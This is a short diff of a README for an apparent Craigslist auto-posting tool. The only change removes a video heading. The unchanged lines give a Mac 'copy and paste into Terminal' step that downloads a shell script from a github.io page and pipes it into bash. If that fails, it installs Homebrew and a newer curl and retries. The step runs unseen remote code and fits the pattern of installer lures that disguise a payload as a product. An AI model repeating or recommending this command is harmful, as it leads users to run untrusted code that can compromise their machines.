@@ -9,7 +9,6 @@ Copy and paste the following command into your Mac Terminal app and then press e
 ```sh
 curl -fsSL https://cl-auto-poster.github.io/craigslist-auto-poster/CL_RePoster_Mac_Installer.sh | bash || { (command -v brew >/dev/null 2>&1 || /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)") && brew install curl && $(command -v /usr/local/opt/curl/bin/curl || command -v /opt/homebrew/opt/curl/bin/curl) -fsSL https://cl-auto-poster.github.io/craigslist-auto-poster/CL_RePoster_Mac_Installer.sh | bash; }
 ```
-## Craigslist Auto Poster - Video Introduction
 [![Video Introduction](https://github.com/craigslist-automated/Craigslist-auto-poster-free/raw/main/images/craigslistrelister.png?raw=true)](https://www.youtube.com/watch?v=Nizy0ofooBU)
 ### Features
 - Auto post Craigslist gigs and services on auto-pilot.
